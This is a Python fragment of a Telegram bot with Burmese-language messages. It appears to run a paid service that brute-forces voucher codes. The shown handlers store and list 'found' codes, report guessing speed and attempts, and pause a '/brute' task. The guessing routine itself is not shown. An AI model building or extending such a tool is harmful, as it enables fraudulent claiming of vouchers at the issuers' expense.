@dp.message(Command("saved"))
async def cmd_saved(message: types.Message):
    args = message.text.split()
    target_tg_id = message.from_user.id
    
    if len(args) > 1:
        if message.from_user.id == ADMIN_ID:
            try: target_tg_id = int(args[1])
            except: return await message.answer("❌ Invalid TG ID")
        else:
            return await message.answer("⛔ သင်သည် အခြားသူများ၏ Code ကို ကြည့်ရှုခွင့်မရှိပါ။")

    user_doc = await db.tg_users.find_one({"tg_id": target_tg_id})
    if not user_doc:
        return await message.answer("❌ User ကို မတွေ့ပါ။")
        
    current_setup_id = user_doc.get("current_setup_id")
    old_setup_id = user_doc.get("old_setup_id")

    if not current_setup_id and not old_setup_id: 
        return await message.answer("❌ Setup အချက်အလက် မရှိသေးပါ။")

    current_success, current_limited = [], []
    if current_setup_id:
        async for doc in db.vouchers.find({"user_id": target_tg_id, "setup_id": current_setup_id, "status": {"$in": ["SUCCESS", "LIMITED"]}}):
            if doc["status"] == "SUCCESS": current_success.append(f"`{doc['code']}`")
            else: current_limited.append(f"`{doc['code']}`")

    old_success, old_limited = [], []
    if old_setup_id:
        async for doc in db.vouchers.find({"user_id": target_tg_id, "setup_id": old_setup_id, "status": {"$in": ["SUCCESS", "LIMITED"]}}):
            if doc["status"] == "SUCCESS": old_success.append(f"`{doc['code']}`")
            else: old_limited.append(f"`{doc['code']}`")

    if not current_success and not current_limited and not old_success and not old_limited:
         return await message.answer("❌ သိမ်းဆည်းထားသော Code မရှိသေးပါ။")

    warning_msg = ""
    if target_tg_id == message.from_user.id and message.from_user.id != ADMIN_ID:
        is_active = False
        if user_doc:
            if user_doc.get("approval_type") == "count":
                is_active = user_doc.get("found_codes", 0) < user_doc.get("allowed_codes", 0)
            else:
                is_active = time.time() < user_doc.get("expires_at", 0)
                
        if not is_active and user_doc:
            saved_views_used = user_doc.get("saved_views_after_expiry", 0)
            if saved_views_used >= 3:
                return await message.answer(f"⚠️ သင်၏ `/saved` ကြည့်ရှုခွင့် (၃) ကြိမ် ပြည့်သွားပါပြီ။ ထပ်မံကြည့်ရှုရန် သို့မဟုတ် အသုံးပြုရန် {ADMIN_USERNAME} ကို ဆက်သွယ်ပါ။")
            
            saved_views_used += 1
            await db.tg_users.update_one({"tg_id": message.from_user.id}, {"$set": {"saved_views_after_expiry": saved_views_used}})
            rem_views = 3 - saved_views_used
            
            if rem_views > 0:
                warning_msg = f"\n\n⚠️ **အသိပေးချက်:** သင်၏ အသုံးပြုခွင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ။ ဤမှတ်တမ်းကို နောက်ထပ် **{rem_views} ကြိမ်** သာ ကြည့်ရှုခွင့် ရပါမည်။"
            else:
                warning_msg = f"\n\n⚠️ **အသိပေးချက်:** ဤသည်မှာ သင်၏ နောက်ဆုံးအကြိမ် ကြည့်ရှုခွင့် ဖြစ်ပါသည်။ ဤမှတ်တမ်းအား နောက်ထပ် ကြည့်ရှု၍ မရတော့ပါ။"

    if target_tg_id != message.from_user.id:
        msg_text = f"💎 **User {target_tg_id} ၏ သိမ်းဆည်းထားသော Codes များ:**\n\n"
    else:
        msg_text = "💎 **သိမ်းဆည်းထားသော Codes များ:**\n\n"

    if current_success or current_limited:
        msg_text += "🟢 **[ လက်ရှိ Setup မှ Codes ]**\n"
        if current_success: msg_text += "SUCCESS:\n" + ", ".join(current_success) + "\n\n"
        if current_limited: msg_text += "LIMITED:\n" + ", ".join(current_limited) + "\n\n"
        msg_text += "-------------------\n\n"

    if old_success or old_limited:
        msg_text += "🟡 **[ ယခင် Setup အဟောင်းမှ Codes ]**\n"
        if old_success: msg_text += "SUCCESS:\n" + ", ".join(old_success) + "\n\n"
        if old_limited: msg_text += "LIMITED:\n" + ", ".join(old_limited) + "\n\n"

    for i in range(0, len(msg_text), 4000):
        chunk = msg_text[i:i+4000]
        if i + 4000 >= len(msg_text): 
            chunk += warning_msg
        await message.answer(chunk, parse_mode="Markdown")

@dp.message(Command("status"))
async def cmd_status(message: types.Message):
    tg_id = message.from_user.id
    if tg_id not in task_stats or task_stats[tg_id]["status"] == "Idle":
        return await message.answer("❌ အလုပ်လုပ်နေသော Task မရှိပါ။")
        
    text = (
        f"📋 Task Status: {task_stats[tg_id]['status']}\n"
        f"⚡ Speed: {task_stats[tg_id]['speed']:.0f}/sec\n"
        f"🔍 Checked: {task_stats[tg_id]['attempts']}\n"
        f"💎 Found (Total): {task_stats[tg_id]['found']}\n"
    )
    if task_stats[tg_id].get("target_success"):
        text += f"🎯 Target Success: {task_stats[tg_id]['success_count']} / {task_stats[tg_id]['target_success']}"
        
    await message.answer(text)

@dp.message(Command("stop"))
async def cmd_stop(message: types.Message):
    tg_id = message.from_user.id
    if tg_id not in task_stats or task_stats[tg_id]["status"] == "Idle":
        return await message.answer("❌ အလုပ်လုပ်နေသော Task မရှိပါ။")
        
    stop_events[tg_id].set()
    task_stats[tg_id]["status"] = "Stopped"
    await message.answer("✅ ရောက်နေသောနေရာတွင် ရပ်တန့်လိုက်ပါပြီ။\n`/brute` ပြန်ရိုက်ပါက ဆက်လက်လုပ်ဆောင်နိုင်ပါသည်။")

async def handle_ping(request): return web.Response(text="Bot is running smoothly.")

async def start_web_server():
    app = web.Application()
    app.add_routes([web.get('/', handle_ping)])
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 10000)) 
    site = web.TCPSite(runner, '0.0.0.0', port)
    print(f"Starting dummy web server on port {port}...")
    await site.start()

async def main():
    print("Initializing components...")
    await start_web_server()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
